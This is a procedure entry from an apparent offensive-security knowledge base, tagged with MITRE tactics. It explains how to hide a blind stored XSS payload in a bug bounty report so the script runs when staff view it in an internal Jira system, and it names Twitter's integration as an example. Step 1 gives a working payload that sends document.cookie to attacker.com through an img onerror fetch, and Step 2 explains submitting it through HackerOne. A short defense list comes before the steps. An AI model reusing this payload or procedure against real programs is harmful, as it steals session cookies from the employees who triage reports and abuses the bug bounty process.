---
id: proc-uuid-001
tags:
  - xss
  - blind-stored-xss
  - bug-bounty
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:37.888Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-and-Submit-Blind-XSS-Payload-in-Bug-Report

## Summary

This procedure involves creating a malicious bug report with an embedded blind stored XSS payload and submitting it to a bug bounty program like HackerOne, targeting systems that store and display user input without proper sanitization, such as Twitter's internal Jira integration.

## Description

In this attack scenario, the attacker crafts a bug report that includes JavaScript code designed to execute only when viewed by an authorized user in the internal system. The payload is 'blind' because it doesn't provide immediate feedback to the attacker but relies on later execution for data exfiltration. This targets web applications like Jira that handle user-supplied content from external submissions. Prerequisites include access to the bug bounty platform and knowledge of XSS payloads. Expected outcomes are the payload being stored in the backend system, setting the stage for execution upon employee interaction.

## Requirements

1. Account on HackerOne or similar bug bounty platform
2. Knowledge of JavaScript and XSS payload construction
3. Target program that integrates submissions into an internal ticketing system like Jira

## Defense

Defensive measures and detection strategies:

- Implement strict input sanitization and output encoding in ticketing systems like Jira
- Use Content Security Policy (CSP) to restrict script execution
- Monitor for anomalous JavaScript in bug reports and automate payload scanning

## Objectives

1. Embed XSS payload in a legitimate-looking bug report
2. Submit to trigger storage in internal system
3. Achieve initial access vector without direct authentication

## Instructions

### Step 1: Develop XSS Payload

**Context**: Create a simple yet effective blind XSS payload that can be embedded in text fields, such as a script tag that sends data to an attacker-controlled server.

No specific command; manually craft the payload like `<img src=x onerror=fetch('https://attacker.com?data='+document.cookie)>` or a basic alert for testing.

> This payload executes when rendered, capturing page context for exfiltration.

### Step 2: Integrate into Bug Report

**Context**: Compose the bug report with the payload in the description or comments section to ensure it's stored as user input.

No command; use the web form on HackerOne to fill in title, description (insert payload), and submit.

> Submission confirmation indicates successful integration into the workflow.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[blind-stored-xss]]
